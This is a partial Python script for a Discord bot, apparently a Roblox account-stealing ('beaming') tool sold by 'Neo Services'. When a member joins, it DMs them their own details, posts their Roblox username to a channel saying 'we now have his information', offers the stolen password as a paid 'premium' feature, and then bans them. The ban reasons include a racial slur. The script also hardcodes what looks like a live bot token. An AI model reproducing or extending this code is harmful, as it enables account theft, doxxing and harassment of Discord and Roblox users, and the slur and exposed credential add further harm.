...
async def on_member_join(member):
  channel = tizxr.get_channel(1006969202000805891)
  ...
  if check.status_code==200:
    ...
    embed.add_field(name="Your Password:", value="|| Buy Premium For This Feature ||", inline=True)
    embed.add_field(name="Your Description:", value=f"```{description}```", inline=True)
    embed.set_footer(text="Beamed By Neo Services")
    await member.send(embed=embed)
    embed1=discord.Embed(title=f"**{member.name} Just Got Beamed! We Now Have His Information: **", description="This awesome tool is made by Neo Services, to buy some premium features please DM me!", color=0x004cff)
    embed1.set_thumbnail(url=f"{avatar_link}")
    embed1.add_field(name="His Roblox Username:", value=f"*{username}*", inline=True)
    embed1.add_field(name="His Password", value="||** Buy Premium For This Feature **||", inline=True)
    ...
    embed1.set_footer(text="Beamed By Neo Services")
    await channel.send(embed=embed1)
    sleep(1)
    await member.ban(reason="Dumbass Got Beamed")
  else:
    await channel.send("User Could Not Get Beamed, He is too much secuirty!!!")
    await member.ban(reason="Got Beamed Nigga")
...
tizxr.run("MTAwNjk2Nzg1OTg1NzA4MDMyMA.G4LnTx.G1hj5dBNuyT7Y3gPzONrQxTAMV3oBsQjPSWA9w")
